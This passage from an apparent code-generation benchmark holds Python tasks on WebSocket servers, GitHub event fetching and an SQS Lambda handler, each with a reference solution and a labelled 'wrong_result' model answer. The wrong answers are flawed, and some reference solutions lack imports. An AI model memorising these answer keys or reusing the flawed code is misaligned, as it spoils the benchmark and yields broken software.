    "wrong_result": "```python\nimport asyncio\nfrom typing import List, Dict, Any, Union, AsyncIterator\nfrom websockets import WebSocket, ConnectionClosed\n\nclass WebsocketSubProtocols:\n    JSON = \"json\"\n    BYTES = \"bytes\"\n\nclass DataRequest:\n    pass\n\nclass StatusMessage:\n    pass\n\nclass ConnectionManager:\n    def __init__(self):\n        self.active_connections: List[WebSocket] = []\n        self.protocol_dict: Dict[str, WebsocketSubProtocols] = {}\n\n    def get_client(self, websocket: WebSocket) -> str:\n        return f\"{websocket.remote_address[0]}:{websocket.remote_address[1]}\"\n\n    def get_subprotocol(self, headers: Dict) -> WebsocketSubProtocols:\n        sec_websocket_protocol = headers.get('Sec-WebSocket-Protocol')\n        if sec_websocket_protocol and WebsocketSubProtocols.JSON in sec_websocket_protocol.split(','):\n            return WebsocketSubProtocols.JSON\n        elif sec_websocket_protocol and WebsocketSubProtocols.BYTES in sec_websocket_protocol.split(','):\n            return WebsocketSubProtocols.BYTES\n        raise ValueError(\"Unsupported subprotocol\")\n\n    def connect(self, websocket: WebSocket) -> None:\n        client_id = self.get_client(websocket)\n        self.active_connections.append(websocket)\n        self.protocol_dict[client_id] = self.get_subprotocol(websocket.request_headers)\n\n    def disconnect(self, websocket: WebSocket) -> None:\n        client_id = self.get_client(websocket)\n        self.active_connections.remove(websocket)\n        self.protocol_dict.pop(client_id, None)\n\n    async def receive(self, websocket: WebSocket) -> Any:\n        client_id = self.get_client(websocket)\n        protocol = self.protocol_dict.get(client_id)\n        message = await websocket.recv()\n        if protocol == WebsocketSubProtocols.JSON:\n            return json.loads(message)\n        elif protocol == WebsocketSubProtocols.BYTES:\n            return message\n        raise ValueError(\"Unsupported subprotocol\")\n\n    async def iter(self, websocket: WebSocket) -> AsyncIterator[Any]:\n        try:\n            while True:\n                yield await self.receive(websocket)\n        except ConnectionClosed:\n            self.disconnect(websocket)\n\n    async def send(self, websocket: WebSocket, data: Union[DataRequest, StatusMessage]) -> None:\n        client_id = self.get_client(websocket)\n        protocol = self.protocol_dict.get(client_id)\n        if protocol == WebsocketSubProtocols.JSON:\n            await websocket.send(json.dumps(data))\n        elif protocol == WebsocketSubProtocols.BYTES:\n            await websocket.send(data)\n        else:\n            raise ValueError(\"Unsupported subprotocol\")\n```"
  },
  {
    "Task_id": 448,
    "Instruction": "Task Description: Implement a WebSocket server using Tornado in Python that handles WebSocket connections, processes incoming messages, and manages connection lifecycle events.\n\nClass Description: WebSocketServer is a class that sets up a Tornado WebSocket server with an echo handler that sends received messages back to the client.\n\nAttributes:\n- close_future: [Future] - A Future object used to track when the WebSocket connection is closed.\n- app: [Application] - The Tornado web application instance that routes WebSocket connections.\n\nMethods:\n- __init__: [__init__]() -> [None] - Initializes the WebSocket server, creates the Application instance, and sets up the echo handler route.\n- get_app: [get_app]() -> [Application] - Returns the Tornado web application instance.\n- ws_connect: [ws_connect](path: str, **kwargs: dict) -> [WebSocketClientConnection] - Establishes a WebSocket connection to the specified path with optional connection parameters.\n\nClass Description: TestWebSocketHandler is a base WebSocket handler class that provides common functionality for WebSocket connections.\n\nAttributes:\n- close_future: [Future] - A Future object used to signal when the connection is closed.\n- compression_options: [dict] - Options for WebSocket compression.\n\nMethods:\n- initialize: [initialize](close_future: Future = None, compression_options: dict = None) -> [None] - Initializes the handler with optional close_future and compression_options.\n- get_compression_options: [get_compression_options]() -> [dict] - Returns the compression options for the WebSocket connection.\n- on_close: [on_close]() -> [None] - Called when the WebSocket connection is closed; resolves the close_future if it exists.\n\nClass Description: EchoHandler is a WebSocket handler that echoes received messages back to the client.\n\nMethods:\n- on_message: [on_message](message: str or bytes) -> [None] - Handles incoming WebSocket messages and echoes them back to the client. Handles cancellation and closed connection errors gracefully.",
    "Canonical_solution": "from tornado.websocket import WebSocketHandler\nfrom tornado.web import Application\nfrom tornado.concurrent import Future\nfrom tornado import gen\n\nclass TestWebSocketHandler(WebSocketHandler):\n    def initialize(self, close_future=None, compression_options=None):\n        self.close_future = close_future\n        self.compression_options = compression_options\n\n    def get_compression_options(self):\n        return self.compression_options\n\n    def on_close(self):\n        if self.close_future is not None:\n            self.close_future.set_result((self.close_code, self.close_reason))\n\nclass EchoHandler(TestWebSocketHandler):\n    @gen.coroutine\n    def on_message(self, message):\n        try:\n            yield self.write_message(message, isinstance(message, bytes))\n        except asyncio.CancelledError:\n            pass\n        except WebSocketClosedError:\n            pass\n\nclass WebSocketServer:\n    def __init__(self):\n        self.close_future = Future()\n        self.app = Application([\n            (\"/echo\", EchoHandler, dict(close_future=self.close_future))\n        ])\n\n    def get_app(self):\n        return self.app\n\n    @gen.coroutine\n    def ws_connect(self, path, **kwargs):\n        ws = yield websocket_connect(\n            \"ws://127.0.0.1:%d%s\" % (self.get_http_port(), path), **kwargs\n        )\n        raise gen.Return(ws)",
    "Code_level": "Class-level",
    "FSMID_for_test": 50,
    "wrong_result": "```python\nimport tornado.ioloop\nimport tornado.web\nimport tornado.websocket\nfrom concurrent.futures import Future\n\nclass WebSocketServer:\n    def __init__(self):\n        self.close_future = Future()\n        self.app = tornado.web.Application([\n            (r\"/websocket\", EchoHandler),\n        ])\n\n    def get_app(self):\n        return self.app\n\n    def ws_connect(self, path, **kwargs):\n        return tornado.websocket.websocket_connect(f\"ws://localhost:8888{path}\", **kwargs)\n\nclass TestWebSocketHandler(tornado.websocket.WebSocketHandler):\n    def initialize(self, close_future=None, compression_options=None):\n        self.close_future = close_future\n        self.compression_options = compression_options\n\n    def get_compression_options(self):\n        return self.compression_options\n\n    def on_close(self):\n        if self.close_future:\n            self.close_future.set_result(None)\n\nclass EchoHandler(TestWebSocketHandler):\n    async def on_message(self, message):\n        try:\n            await self.write_message(message)\n        except tornado.websocket.WebSocketClosedError:\n            pass\n        except tornado.gen.CancelledError:\n            pass\n\nif __name__ == \"__main__\":\n    server = WebSocketServer()\n    server.app.listen(8888)\n    tornado.ioloop.IOLoop.current().start()\n```"
  },
  {
    "Task_id": 45,
    "Instruction": "Task Description: Create an asynchronous function to fetch GitHub contributor activity data for a specific repository, filtering by time period and excluding certain users.\n\nFunction Description: This function retrieves GitHub events for a repository and processes them to track contributor activity, including created issues, pull requests, and merged commits. It filters events by date and excludes specified users, using GitHub's API with authentication.\n\nInput:\n- owner: str - GitHub repository owner username\n- repo: str - GitHub repository name\n- since: datetime - Minimum datetime for events to include\n- max: int (default=100) - Maximum number of events to fetch\n- excluded_users: set[str] | None (default=None) - Set of usernames to exclude\n- token: str | None (default=None) - GitHub API token (falls back to Marvin settings if None)\n\nOutput:\n- dict[str, dict[str, str | list]] - Dictionary mapping contributor usernames to their activity data, where each value is a dictionary containing:\n  - \"created_issues\": list - Opened issues by the contributor\n  - \"created_pull_requests\": list - Opened PRs by the contributor\n  - \"merged_commits\": list - Merged commits by the contributor (excluding merge commits)",
    "Canonical_solution": "import httpx\nimport marvin\nfrom datetime import datetime\n\nasync def fetch_contributor_data(\n    owner: str,\n    repo: str,\n    since: datetime,\n    max: int = 100,\n    excluded_users: set[str] | None = None,\n    token: str | None = None,\n) -> dict[str, dict[str, str | list]]:\n    if not excluded_users:\n        excluded_users = {}\n\n    if not token:\n        token = marvin.settings.github_token.get_secret_value()\n\n    events_url = f\"https://api.github.com/repos/{owner}/{repo}/events?per_page={max}\"\n\n    contributors_activity = {}\n\n    async with httpx.AsyncClient(\n        headers={\n            \"Accept\": \"application/vnd.github.v3+json\",\n            \"Authorization\": f\"token {token}\",\n        }\n    ) as client:\n        events = (await client.get(events_url)).json()\n\n        for event in events:\n            if (actor := event.get(\"actor\")) and actor[\"login\"] in excluded_users:\n                continue\n            created_at = datetime.fromisoformat(event[\"created_at\"].rstrip(\"Z\"))\n            if created_at < since:\n                continue\n\n            contributor_username = actor[\"login\"] if actor else \"unknown\"\n\n            if contributor_username not in contributors_activity:\n                contributors_activity[contributor_username] = {\n                    \"created_issues\": [],\n                    \"created_pull_requests\": [],\n                    \"merged_commits\": [],\n                }\n\n            if (\n                event[\"type\"] == \"IssuesEvent\"\n                and event[\"payload\"][\"action\"] == \"opened\"\n            ):\n                contributors_activity[contributor_username][\"created_issues\"].append(\n                    event[\"payload\"][\"issue\"]\n                )\n\n            elif (\n                event[\"type\"] == \"PullRequestEvent\"\n                and event[\"payload\"][\"action\"] == \"opened\"\n            ):\n                contributors_activity[contributor_username][\n                    \"created_pull_requests\"\n                ].append(event[\"payload\"][\"pull_request\"])\n\n            elif event[\"type\"] == \"PushEvent\":\n                for commit_data in event[\"payload\"][\"commits\"]:\n                    commit = (await client.get(commit_data[\"url\"])).json()\n                    commit_message = commit[\"commit\"][\"message\"].split(\"\\n\")\n                    cleaned_commit_message = \"\\n\".join(\n                        line\n                        for line in commit_message\n                        if not line.strip().lower().startswith(\"co-authored-by:\")\n                    )\n                    commit_msg = commit[\"commit\"][\"message\"] = cleaned_commit_message\n\n                    if (\n                        \"Merge remote-tracking branch\" not in commit_msg\n                        and \"Merge branch\" not in commit_msg\n                    ):\n                        contributors_activity[contributor_username][\n                            \"merged_commits\"\n                        ].append(commit)\n\n    return contributors_activity",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "```python\nimport asyncio\nimport aiohttp\nfrom datetime import datetime\nfrom typing import Optional, Set, Dict, List\n\nasync def fetch_contributor_activity(\n    owner: str,\n    repo: str,\n    since: datetime,\n    max: int = 100,\n    excluded_users: Optional[Set[str]] = None,\n    token: Optional[str] = None\n) -> Dict[str, Dict[str, List[str]]]:\n    if excluded_users is None:\n        excluded_users = set()\n    \n    headers = {}\n    if token:\n        headers['Authorization'] = f'token {token}'\n    \n    async with aiohttp.ClientSession(headers=headers) as session:\n        url = f'https://api.github.com/repos/{owner}/{repo}/events'\n        params = {\n            'per_page': max,\n            'since': since.isoformat()\n        }\n        \n        async with session.get(url, params=params) as response:\n            if response.status != 200:\n                raise Exception(f'Failed to fetch events: {await response.text()}')\n            \n            events = await response.json()\n            \n            activity_data = {}\n            for event in events:\n                actor = event.get('actor', {}).get('login')\n                if actor in excluded_users:\n                    continue\n                \n                if actor not in activity_data:\n                    activity_data[actor] = {\n                        \"created_issues\": [],\n                        \"created_pull_requests\": [],\n                        \"merged_commits\": []\n                    }\n                \n                if event['type'] == 'IssuesEvent':\n                    if event['payload']['action'] == 'opened':\n                        activity_data[actor][\"created_issues\"].append(event['payload']['issue']['html_url'])\n                elif event['type'] == 'PullRequestEvent':\n                    if event['payload']['action'] == 'opened':\n                        activity_data[actor][\"created_pull_requests\"].append(event['payload']['pull_request']['html_url'])\n                elif event['type'] == 'PushEvent':\n                    for commit in event['payload']['commits']:\n                        if commit['distinct'] and commit['message'].startswith('Merge'):\n                            activity_data[actor][\"merged_commits\"].append(commit['sha'])\n            \n            return activity_data\n```"
  },
  {
    "Task_id": 459,
    "Instruction": "Task Description: Create a function that sets up and runs a WebSocket server in a separate thread, allowing for asynchronous communication between clients and the server.\n\nFunction Description: The function `run_websocket_server` initializes and starts a WebSocket server on a specified port. The server runs in a separate thread to avoid blocking the main program. It handles incoming messages by echoing them back to the client. The function returns the event loop and the thread object for potential external control.\n\nInput:  \n- `port` [int] - The port number on which the WebSocket server will listen for incoming connections.\n\nOutput:  \n- `event_loop` [asyncio.AbstractEventLoop] - The event loop associated with the WebSocket server, which can be used to manage or stop the server.  \n- `thd` [threading.Thread] - The thread object running the WebSocket server, which can be used to join or terminate the thread.",
    "Canonical_solution": "import asyncio\nimport websockets\nfrom threading import Thread\n\ndef run_websocket_server(port):\n    event_loop = asyncio.new_event_loop()\n\n    async def empty_server(websocket, path):\n        data = await websocket.recv()\n        await asyncio.sleep(0.02)\n        await websocket.send(data)\n\n    def run_server():\n        asyncio.set_event_loop(event_loop)\n        server = websockets.serve(empty_server, \"127.0.0.1\", port)\n        event_loop.run_until_complete(server)\n        event_loop.run_forever()\n\n    thd = Thread(target=run_server)\n    thd.start()\n    return event_loop, thd",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "```python\nimport asyncio\nimport threading\nfrom websockets import serve\n\nasync def echo(websocket, path):\n    async for message in websocket:\n        await websocket.send(message)\n\ndef run_websocket_server(port):\n    loop = asyncio.new_event_loop()\n    asyncio.set_event_loop(loop)\n    start_server = serve(echo, \"localhost\", port)\n    loop.run_until_complete(start_server)\n    thd = threading.Thread(target=loop.run_forever)\n    thd.start()\n    return loop, thd\n```"
  },
  {
    "Task_id": 46,
    "Instruction": "Task Description: Create an asynchronous HTTP client function that handles SQS records, makes HTTP requests, and processes responses in an AWS Lambda environment.\n\nFunction Description: The function processes SQS records asynchronously, makes HTTP GET requests to a specified endpoint using httpx, and returns the HTTP status code. It's designed to work with AWS Lambda Powertools for batch processing.\n\nInput: \n- record: SQSRecord - A single SQS record containing message data\n- (Implicit) client: httpx.AsyncClient - An asynchronous HTTP client created within the function\n\nOutput: \n- int - HTTP status code from the GET request (e.g., 200, 404, etc.)\n- (Through processor) Processed batch response for the Lambda handler",
    "Canonical_solution": "import httpx\nfrom aws_lambda_powertools.utilities.batch import AsyncBatchProcessor, EventType, async_process_partial_response\nfrom aws_lambda_powertools.utilities.data_classes.sqs_event import SQSRecord\nfrom aws_lambda_powertools.utilities.typing import LambdaContext\n\nprocessor = AsyncBatchProcessor(event_type=EventType.SQS)\n\nasync def async_record_handler(record: SQSRecord):\n    async with httpx.AsyncClient() as client:\n        ret = await client.get(\"https://httpbin.org/get\")\n    return ret.status_code\n\ndef lambda_handler(event, context: LambdaContext):\n    return async_process_partial_response(\n        event=event,\n        record_handler=async_record_handler,\n        processor=processor,\n        context=context,\n    )",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "```python\nimport httpx\nfrom aws_lambda_powertools import BatchProcessor, Logger, Tracer\nfrom aws_lambda_powertools.utilities.data_classes import SQSEvent, SQSRecord\n\nprocessor = BatchProcessor()\nlogger = Logger()\ntracer = Tracer()\n\n@tracer.capture_method\nasync def process_record(record: SQSRecord, client: httpx.AsyncClient) -> int:\n    message_body = record.body\n    # Assuming the message body contains the URL to make the GET request\n    url = message_body\n    \n    try:\n        async with client.get(url) as response:\n            return response.status_code\n    except Exception as e:\n        logger.error(f\"Error making request to {url}: {str(e)}\")\n        raise\n\n@tracer.capture_lambda_handler\ndef lambda_handler(event: dict, context):\n    async def async_handler():\n        async with httpx.AsyncClient() as client:\n            await processor.process(event=SQSEvent(event), record_handler=lambda record: process_record(record, client))\n    \n    return processor.response()\n```"
  },
  {
    "Task_id": 461,
    "Instruction": "Task Description: Implement a WebSocket server interface that manages client connections and facilitates message broadcasting in a synchronous manner using asyncio and threading.\n\nClass Description: SyncWebSocketInterface is a class that provides a synchronous interface to an asynchronous WebSocket server. It manages client connections, handles message broadcasting to all connected clients, and runs the asyncio event loop in a separate thread to maintain responsiveness.\n\nAttributes:\n\nclients: [set] - A set of connected WebSocket clients.\nloop: [asyncio.AbstractEventLoop] - The asyncio event loop used for WebSocket operations.\nthread: [threading.Thread] - The thread running the asyncio event loop.\n\nMethods:\n\n__init__: [Name]() -> [None] - Initializes the WebSocket interface, creates a new event loop, and starts it in a separate thread.\n_run_event_loop: [Name]() -> [None] - Internal method that runs the asyncio event loop in the dedicated thread.\n_run_async: [Name](coroutine) -> [None] - Runs a coroutine in the asyncio event loop from another thread.\n_send_to_all_clients: [Name](clients, msg) -> [None] - Internal async method to send a message to all specified clients.\nregister_client: [Name](websocket) -> [None] - Registers a new WebSocket client to the set of connected clients.\nunregister_client: [Name](websocket) -> [None] - Removes a WebSocket client from the set of connected clients.\ninternal_monologue: [Name](msg) -> [None] - Prints and broadcasts an internal monologue message to all clients.\nassistant_message: [Name](msg) -> [None] - Prints and broadcasts an assistant message to all clients.\nfunction_message: [Name](msg) -> [None] - Prints and broadcasts a function message to all clients.\nclose: [Name]() -> [None] - Stops the event loop and joins the thread, cleaning up resources.",
    "Canonical_solution": "import asyncio\nimport threading\nimport letta.server.ws_api.protocol as protocol\n\nclass SyncWebSocketInterface:\n    def __init__(self):\n        self.clients = set()\n        self.loop = asyncio.new_event_loop()\n        self.thread = threading.Thread(target=self._run_event_loop, daemon=True)\n        self.thread.start()\n\n    def _run_event_loop(self):\n        asyncio.set_event_loop(self.loop)\n        try:\n            self.loop.run_forever()\n        finally:\n            self.loop.run_until_complete(self.loop.shutdown_asyncgens())\n            self.loop.close()\n\n    def _run_async(self, coroutine):\n        if not self.loop.is_closed():\n            asyncio.run_coroutine_threadsafe(coroutine, self.loop)\n\n    async def _send_to_all_clients(self, clients, msg):\n        if clients:\n            await asyncio.gather(*(client.send_text(msg) for client in clients))\n\n    def register_client(self, websocket):\n        self.clients.add(websocket)\n\n    def unregister_client(self, websocket):\n        self.clients.remove(websocket)\n\n    def internal_monologue(self, msg):\n        print(msg)\n        if self.clients:\n            self._run_async(self._send_to_all_clients(self.clients, protocol.server_agent_internal_monologue(msg)))\n\n    def assistant_message(self, msg):\n        print(msg)\n        if self.clients:\n            self._run_async(self._send_to_all_clients(self.clients, protocol.server_agent_assistant_message(msg)))\n\n    def function_message(self, msg):\n        print(msg)\n        if self.clients:\n            self._run_async(self._send_to_all_clients(self.clients, protocol.server_agent_function_message(msg)))\n\n    def close(self):\n        self.loop.call_soon_threadsafe(self.loop.stop)\n        self.thread.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 45,
    "wrong_result": "```python\nimport asyncio\nimport threading\nimport websockets\n\nclass SyncWebSocketInterface:\n    def __init__(self):\n        self.clients = set()\n        self.loop = asyncio.new_event_loop()\n        self.thread = threading.Thread(target=self._run_event_loop)\n        self.thread.start()\n\n    def _run_event_loop(self):\n        asyncio.set_event_loop(self.loop)\n        self.loop.run_forever()\n\n    def _run_async(self, coroutine):\n        future = asyncio.run_coroutine_threadsafe(coroutine, self.loop)\n        return future.result()\n\n    async def _send_to_all_clients(self, clients, msg):\n        await asyncio.gather(*(client.send(msg) for client in clients))\n\n    def register_client(self, websocket):\n        self._run_async(self._register_client(websocket))\n\n    async def _register_client(self, websocket):\n        self.clients.add(websocket)\n\n    def unregister_client(self, websocket):\n        self._run_async(self._unregister_client(websocket))\n\n    async def _unregister_client(self, websocket):\n        self.clients.discard(websocket)\n\n    def internal_monologue(self, msg):\n        print(f\"Internal Monologue: {msg}\")\n        self._run_async(self._send_to_all_clients(self.clients, f\"Internal Monologue: {msg}\"))\n\n    def assistant_message(self, msg):\n        print(f\"Assistant Message: {msg}\")\n        self._run_async(self._send_to_all_clients(self.clients, f\"Assistant Message: {msg}\"))\n\n    def function_message(self, msg):\n        print(f\"Function Message: {msg}\")\n        self._run_async(self._send_to_all_clients(self.clients, f\"Function Message: {msg}\"))\n\n    def close(self):\n        self.loop.call_soon_threadsafe(self.loop.stop)\n        self.thread.join()\n```"
  },
  {
    "Task_id": 462,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send appropriate responses based on the requested function.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, and responds based on the specified function in the message. It supports three main operations: echoing back a value, prompting for user input, and throwing an error message. The server runs indefinitely, maintaining persistent connections with clients.\n\nInput: \n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput: None (The function runs indefinitely, sending responses back through the WebSocket connection)\n\nThe function processes incoming JSON messages with the following structure:\n{\n    \"function\": str - The operation to perform (\"echo\", \"ask\", or \"throw\"),\n    \"args\": list - Arguments for the specified function\n}\n\nThe function sends back JSON responses with either:\n- A \"return\" field containing the result for successful operations\n- A \"throw\" field containing error messages for failures or unknown functions",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "import asyncio\nimport websockets\nimport json\n\nasync def handler(websocket, path):\n    async for message in websocket:\n        try:\n            data = json.loads(message)\n            function = data.get(\"function\")\n            args = data.get(\"args\", [])\n            \n            if function == \"echo\":\n                response = {\"return\": args[0]}\n            elif function == \"ask\":\n                response = {\"return\": f\"You asked: {args[0]}\"}\n            elif function == \"throw\":\n                raise ValueError(args[0])\n            else:\n                raise ValueError(\"Unknown function\")\n            \n            await websocket.send(json.dumps(response))\n        \n        except Exception as e:\n            await websocket.send(json.dumps({\"throw\": str(e)}))\n\nstart_server = websockets.serve(handler, \"localhost\", 8765)\n\nasyncio.get_event_loop().run_until_complete(start_server)\nasyncio.get_event_loop().run_forever()"
  },
  {
    "Task_id": 465,
    "Instruction": "Task Description: Create a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON data, performs specified operations (echo, ask, throw), and sends back appropriate responses. The start_websocket_server function initializes and runs the WebSocket server.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput:\n- None (The function runs indefinitely, maintaining the WebSocket connection and processing messages)\n\nNote: The server expects JSON messages with the following structure:\n{\n  \"function\": str (one of 'echo', 'ask', 'throw', or other),\n  \"args\": list (arguments for the specified function),\n  \"return\": any (will be populated in response),\n  \"throw\": any (will be populated in case of errors)\n}",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "import asyncio\nimport websockets\nimport json\n\nasync def handle_websocket(websocket, path):\n    async for message in websocket:\n        try:\n            data = json.loads(message)\n            if data['function'] == 'echo':\n                response = {'return': data['args']}\n            elif data['function'] == 'ask':\n                response = {'return': f\"Asked: {data['args']}\"}\n            elif data['function'] == 'throw':\n                raise ValueError(\"Intentional error\")\n            else:\n                response = {'throw': 'Unknown function'}\n        except Exception as e:\n            response = {'throw': str(e)}\n        await websocket.send(json.dumps(response))\n\ndef start_websocket_server():\n    start_server = websockets.serve(handle_websocket, 'localhost', 8765)\n    asyncio.get_event_loop().run_until_complete(start_server)\n    asyncio.get_event_loop().run_forever()\n\nif __name__ == \"__main__\":\n    start_websocket_server()"
  },
  {
    "Task_id": 466,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, performs specified operations (echo, ask, throw), and sends back appropriate responses. The start_websocket_server function initializes and runs the WebSocket server.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput:\n- None (The function runs indefinitely, processing messages and sending responses through the WebSocket connection)\n\nNote: The server expects JSON messages with the following structure:\n{\n  \"function\": \"echo|ask|throw\",  // Operation to perform\n  \"args\": [...]                // Arguments for the operation\n}",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "import asyncio\nimport websockets\nimport json\n\nasync def handle_websocket(websocket, path):\n    async for message in websocket:\n        try:\n            data = json.loads(message)\n            function_name = data.get(\"function\")\n            args = data.get(\"args\", [])\n            \n            if function_name == \"echo\":\n                response = {\"result\": args}\n            elif function_name == \"ask\":\n                response = {\"result\": f\"Asked with arguments: {args}\"}\n            elif function_name == \"throw\":\n                raise Exception(f\"Error with arguments: {args}\")\n            else:\n                response = {\"error\": \"Unknown function\"}\n            \n            await websocket.send(json.dumps(response))\n        \n        except json.JSONDecodeError:\n            await websocket.send(json.dumps({\"error\": \"Invalid JSON\"}))\n        except Exception as e:\n            await websocket.send(json.dumps({\"error\": str(e)}))\n\ndef start_websocket_server(host=\"localhost\", port=8765):\n    start_server = websockets.serve(handle_websocket, host, port)\n    asyncio.get_event_loop().run_until_complete(start_server)\n    asyncio.get_event_loop().run_forever()\n\nif __name__ == \"__main__\":\n    start_websocket_server()"
  },
  {
    "Task_id": 469,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle bidirectional communication between clients and the server, with support for message production and consumption through multiprocessing queues.\n\nFunction Description: The SocketWorker function establishes a WebSocket server that manages client connections, processes incoming messages, and sends messages to specific clients based on their unique IDs. It uses asynchronous programming to handle multiple clients concurrently.\n\nInput:\n- queueX: multiprocessing.Queue - Queue for outgoing messages to clients (format: (client_id, message))\n- queueZ: multiprocessing.Queue - Queue for incoming messages from clients (format: (client_id, message))\n\nOutput: None (The function runs indefinitely as a server process)\n\nMethods (nested async functions within SocketWorker):\n\n1. producer() -> Union[Tuple[str, str], str] - Generates messages to be sent to clients, either from queueX or periodic ping messages.\n\n2. producer_handler(websocket: WebSocketServerProtocol, path: str) -> None - Handles sending messages to connected clients via the WebSocket connection.\n\n3. consumer(websocket: WebSocketServerProtocol, msg: str) -> None - Processes incoming messages from clients, handling pong responses and forwarding valid requests to queueZ.\n\n4. consumer_handler(websocket: WebSocketServerProtocol, path: str) -> None - Continuously receives messages from a client connection and processes them.\n\n5. server(websocket: WebSocketServerProtocol, path: str) -> None - Main connection handler that manages client lifecycle, assigning unique IDs and coordinating producer/consumer tasks.\n\n6. srv_exception(loop: asyncio.AbstractEventLoop, context: dict) -> None - Exception handler for the WebSocket server event loop.",
    "Canonical_solution": "import asyncio\nimport websockets\nimport signal\nimport json\nimport random\nimport time\nfrom multiprocessing import Queue\n\n_DEBUG_LEVEL_ = 2\nPORT_NUM = 8266\n\ndef SocketWorker(queueX, queueZ):\n    signal.signal(signal.SIGINT, signal.SIG_DFL)\n    USERS = set()\n\n    async def producer():\n        hasData = False\n        try:\n            K, out = queueX.get(timeout=0.05)\n            hasData = True\n        except:\n            pass\n        if hasData:\n            return (K, out)\n        else:\n            await asyncio.sleep(0.001)\n            if random.random() < -0.003:\n                return '[PING]'\n            else:\n                return ''\n\n    async def producer_handler(websocket, path):\n        while True:\n            msg = await producer()\n            if isinstance(msg, tuple):\n                K, msg = msg\n                for x in USERS:\n                    if x.client_id == K:\n                        await x.send(msg)\n                        break\n            elif msg != '':\n                await websocket.send(msg)\n\n    async def consumer(websocket, msg):\n        if msg == '[PONG]':\n            return\n        try:\n            msg = json.loads(msg)\n            if msg['op'].lower() == 'get':\n                queueZ.put((websocket.client_id, msg['txt']))\n        except Exception as e:\n            print(e)\n            pass\n\n    async def consumer_handler(websocket, path):\n        while True:\n            msg = await websocket.recv()\n            await consumer(websocket, msg)\n\n    async def server(websocket, path):\n        websocket.client_id = '%020x' % random.randrange(16**20)\n        USERS.add(websocket)\n        print(\"[ws connect]\", len(USERS), 'users @',\n              time.strftime(\"%Y %b %d %H:%M:%S\", time.localtime(time.time())))\n        try:\n            await websocket.send('id_' + websocket.client_id)\n            consumer_task = asyncio.ensure_future(\n                consumer_handler(websocket, path))\n            producer_task = asyncio.ensure_future(\n                producer_handler(websocket, path))\n            done, pending = await asyncio.wait(\n                [consumer_task, producer_task],\n                return_when=asyncio.FIRST_COMPLETED)\n            for task in pending:\n                task.cancel()\n        finally:\n            USERS.remove(websocket)\n            print(\"[ws disconnect]\", len(USERS))\n\n    def srv_exception(loop, context):\n        if _DEBUG_LEVEL_ 